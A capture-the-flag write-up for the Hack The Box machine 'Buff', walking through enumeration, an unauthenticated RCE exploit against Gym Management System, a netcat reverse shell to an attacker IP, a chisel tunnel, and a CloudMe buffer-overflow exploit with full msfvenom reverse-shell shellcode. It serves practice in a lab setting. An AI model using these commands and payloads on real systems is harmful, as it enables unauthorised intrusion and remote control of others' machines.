#windows
# Enumeration
## nmap

```
nmap -sC -sV -Pn buff.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 09:19 EST
Nmap scan report for buff.htb (10.129.102.101)
Host is up (0.19s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.85 seconds
                                                              
```

## Feroxbuster
```
feroxbuster -u http://buff.htb:8080 -k
301      GET        9l       30w      337c http://buff.htb:8080/include => http://buff.htb:8080/include/
301      GET        9l       30w      333c http://buff.htb:8080/img => http://buff.htb:8080/img/
301      GET        9l       30w      336c http://buff.htb:8080/upload => http://buff.htb:8080/upload/
403      GET       42l       97w        0c http://buff.htb:8080/webalizer
301      GET        9l       30w      337c http://buff.htb:8080/profile => http://buff.htb:8080/profile/
200      GET      133l      308w     4969c http://buff.htb:8080/
403      GET       45l      113w        0c http://buff.htb:8080/phpmyadmin
301      GET        9l       30w      337c http://buff.htb:8080/Include => http://buff.htb:8080/Include/
301      GET        9l       30w      336c http://buff.htb:8080/Upload => http://buff.htb:8080/Upload/
301      GET        9l       30w      344c http://buff.htb:8080/profile/upload => http://buff.htb:8080/profile/upload/
301      GET        9l       30w      333c http://buff.htb:8080/IMG => http://buff.htb:8080/IMG/
301      GET        9l       30w      333c http://buff.htb:8080/Img => http://buff.htb:8080/Img/
301      GET        9l       30w      336c http://buff.htb:8080/UPLOAD => http://buff.htb:8080/UPLOAD/
301      GET        9l       30w      332c http://buff.htb:8080/ex => http://buff.htb:8080/ex/
301      GET        9l       30w      340c http://buff.htb:8080/ex/profile => http://buff.htb:8080/ex/profile/

```

## Check the website

`http://buff.htb:8080`

### header
```
curl -I http://buff.htb:8080 
HTTP/1.1 200 OK
Date: Sat, 18 Feb 2023 14:28:14 GMT
Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
X-Powered-By: PHP/7.4.6
Set-Cookie: sec_session_id=ruaakvvlimfp734sr30i9tefnh; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: sec_session_id=mr6ap5rljnh1571nrktjb28b6f; path=/; HttpOnly
Content-Type: text/html; charset=UTF-8
```

###  /profile/index.php

![[Pasted image 20230218233241.png]]

### searchsploit

```
searchsploit gym management
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                          | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                       | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                 | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                       | php/webapps/48506.py
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

https://www.exploit-db.com/exploits/48506

# Foothold
## Get the shell
```
 python 48506.py http://buff.htb:8080/    
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                    
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> 
```

## user flag
```
type \users\shaun\desktop\user.txt
�PNG
▒

```

## upload nc64.exe

```
/usr/share/windows-binaries/nc.exe
```

https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4
on kali machine

```
curl http://10.10.14.44:8000/nc64.exe --output nc64.exe
```

![[Pasted image 20230219000807.png]]

## Persistent shell
```
copy nc64.exe \programdata\
```

```
C:\xampp\htdocs\gym\upload> dir \programdata
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\programdata

16/06/2020  14:10    <DIR>          Microsoft OneDrive
18/02/2023  15:06            55,296 nc64.exe
16/06/2020  14:14    <DIR>          Package Cache
14/07/2020  12:17    <DIR>          Packages
18/02/2023  15:11    <DIR>          regid.1991-06.com.microsoft
11/04/2018  23:38    <DIR>          SoftwareDistribution
16/06/2020  14:09    <DIR>          USOPrivate
16/06/2020  14:09    <DIR>          USOShared
16/06/2020  14:14    <DIR>          VMware
12/04/2018  09:21    <DIR>          WindowsHolographicDevices
               1 File(s)         55,296 bytes
               9 Dir(s)   7,745,662,976 bytes free
```

```
C:\xampp\htdocs\gym\upload> \programdata\nc64.exe -e cmd 10.10.14.44 1234
```

on kali machine
```
rlwrap nc -lvnp 1234
```

# Privilege Escalation
## Enumeration

### C:\xampp
passwords.txt
```
C:\xampp>type passwords.txt
type passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

```

## 

```
netstat -ano | findstr TCP | findstr ":0"
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5812
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       1164
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       9036
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       520
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1048
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1676
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2256
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       684
  TCP    10.129.102.101:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       9128
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       1912
  TCP    [::]:135               [::]:0                 LISTENING       960
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       1164
  TCP    [::]:8080              [::]:0                 LISTENING       9036
  TCP    [::]:49664             [::]:0                 LISTENING       520
  TCP    [::]:49665             [::]:0                 LISTENING       1048
  TCP    [::]:49666             [::]:0                 LISTENING       1676
  TCP    [::]:49667             [::]:0                 LISTENING       2256
  TCP    [::]:49668             [::]:0                 LISTENING       668
  TCP    [::]:49669             [::]:0                 LISTENING       684
```

Two services?
3306 MySQL, 8888 something else

## check 3306 from kali
```
nmap -Pn buff.htb -p 3306 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 10:28 EST
Nmap scan report for buff.htb (10.129.102.101)
Host is up.

PORT     STATE    SERVICE
3306/tcp filtered mysql

Nmap done: 1 IP address (1 host up) scanned in 2.02 seconds

```

## Finding CloudMe

```
tasklist /v | findstr 1912

CloudMe.exe                   1912                            0     38,508 K Unknown         N/A                                                     0:00:01 N/A                                                                     
```

```
C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   8,434,163,712 bytes free
```


## searchsploit

```
searchsploit cloudme         
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                       | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                              | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                              | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                                             | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                                      | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                                               | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                                  | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                                              | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                                     | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                                      | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                                   | windows_x86-64/remote/44784.py
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## chisel
https://github.com/jpillora/chisel/releases/tag/v1.8.1

```
curl http://10.10.14.44:8000/chisel.exe --output chisel.exe
```

#### server on kali
```
chisel server -p 8000 --reverse  
2023/02/19 00:52:36 server: Reverse tunnelling enabled
2023/02/19 00:52:36 server: Fingerprint 
2023/02/19 00:52:36 server: Listening on http://0.0.0.0:8000
```
#### client on buff
```
chisel.exe client 10.10.14.44:8000 R:8888:localhost:8888
```


on server
`2023/02/19 00:57:27 server: session#1: tun: proxy#R:8888=>localhost:8888: Listening` should showup.

If we are also interested in sql server, we can add another port.
```
chisel.exe client 10.10.14.44:8000 R:8888:localhost:8888 R:3306:localhost:3306
```
### Mysql
on kali
```
mysql -u root -p -h 127.0.0.1
```
no password so just type enter

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| table              |
| test               |
+--------------------+
```

```
use phpmyadmin;
show tables;
+------------------------+
| Tables_in_phpmyadmin   |
+------------------------+
| pma__bookmark          |
| pma__central_columns   |
| pma__column_info       |
| pma__designer_settings |
| pma__export_templates  |
| pma__favorite          |
| pma__history           |
| pma__navigationhiding  |
| pma__pdf_pages         |
| pma__recent            |
| pma__relation          |
| pma__savedsearches     |
| pma__table_coords      |
| pma__table_info        |
| pma__table_uiprefs     |
| pma__tracking          |
| pma__userconfig        |
| pma__usergroups        |
| pma__users             |
+------------------------+
```

```
select * from pma__users;
Empty set (0.407 sec)
```

#### After connection

```
netstat -ntlp                   
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:46163         0.0.0.0:*               LISTEN      512452/chrome --rem 
tcp        0      0 127.0.0.1:44671         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      567435/chisel       
tcp6       0      0 :::8888                 :::*                    LISTEN      567435/chisel       
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      512136/java         
tcp6       0      0 127.0.0.1:39771         :::*                    LISTEN      512136/java         
```

#### searchsploit cloudme

```
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                       | windows/remote/48389.py
```

we need to create my own payload

payload generation
```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=1234 -b '\x00\x0A\x0D' -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xba\x23\x94\xf7\xe5\xd9\xf6\xd9\x74\x24\xf4"
payload += b"\x58\x2b\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e"
payload += b"\x03\x73\x9a\x15\x10\x8f\x4a\x5b\xdb\x6f\x8b"
payload += b"\x3c\x55\x8a\xba\x7c\x01\xdf\xed\x4c\x41\x8d"
payload += b"\x01\x26\x07\x25\x91\x4a\x80\x4a\x12\xe0\xf6"
payload += b"\x65\xa3\x59\xca\xe4\x27\xa0\x1f\xc6\x16\x6b"
payload += b"\x52\x07\x5e\x96\x9f\x55\x37\xdc\x32\x49\x3c"
payload += b"\xa8\x8e\xe2\x0e\x3c\x97\x17\xc6\x3f\xb6\x86"
payload += b"\x5c\x66\x18\x29\xb0\x12\x11\x31\xd5\x1f\xeb"
payload += b"\xca\x2d\xeb\xea\x1a\x7c\x14\x40\x63\xb0\xe7"
payload += b"\x98\xa4\x77\x18\xef\xdc\x8b\xa5\xe8\x1b\xf1"
payload += b"\x71\x7c\xbf\x51\xf1\x26\x1b\x63\xd6\xb1\xe8"
payload += b"\x6f\x93\xb6\xb6\x73\x22\x1a\xcd\x88\xaf\x9d"
payload += b"\x01\x19\xeb\xb9\x85\x41\xaf\xa0\x9c\x2f\x1e"
payload += b"\xdc\xfe\x8f\xff\x78\x75\x3d\xeb\xf0\xd4\x2a"
payload += b"\xd8\x38\xe6\xaa\x76\x4a\x95\x98\xd9\xe0\x31"
payload += b"\x91\x92\x2e\xc6\xd6\x88\x97\x58\x29\x33\xe8"
payload += b"\x71\xee\x67\xb8\xe9\xc7\x07\x53\xe9\xe8\xdd"
payload += b"\xf4\xb9\x46\x8e\xb4\x69\x27\x7e\x5d\x63\xa8"
payload += b"\xa1\x7d\x8c\x62\xca\x14\x77\xe5\xff\xe2\x79"
payload += b"\xd9\x97\xf0\x85\x25\xba\x7c\x63\x4f\x2a\x29"
payload += b"\x3c\xf8\xd3\x70\xb6\x99\x1c\xaf\xb3\x9a\x97"
payload += b"\x5c\x44\x54\x50\x28\x56\x01\x90\x67\x04\x84"
payload += b"\xaf\x5d\x20\x4a\x3d\x3a\xb0\x05\x5e\x95\xe7"
payload += b"\x42\x90\xec\x6d\x7f\x8b\x46\x93\x82\x4d\xa0"
payload += b"\x17\x59\xae\x2f\x96\x2c\x8a\x0b\x88\xe8\x13"
payload += b"\x10\xfc\xa4\x45\xce\xaa\x02\x3c\xa0\x04\xdd"
payload += b"\x93\x6a\xc0\x98\xdf\xac\x96\xa4\x35\x5b\x76"
payload += b"\x14\xe0\x1a\x89\x99\x64\xab\xf2\xc7\x14\x54"
payload += b"\x29\x4c\x24\x1f\x73\xe5\xad\xc6\xe6\xb7\xb3"
payload += b"\xf8\xdd\xf4\xcd\x7a\xd7\x84\x29\x62\x92\x81"
payload += b"\x76\x24\x4f\xf8\xe7\xc1\x6f\xaf\x08\xc0"
```

replace the exploit python code with the new payload.


## Root
```

C:\Windows\system32>whoami
whoami
buff\administrator

```

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
```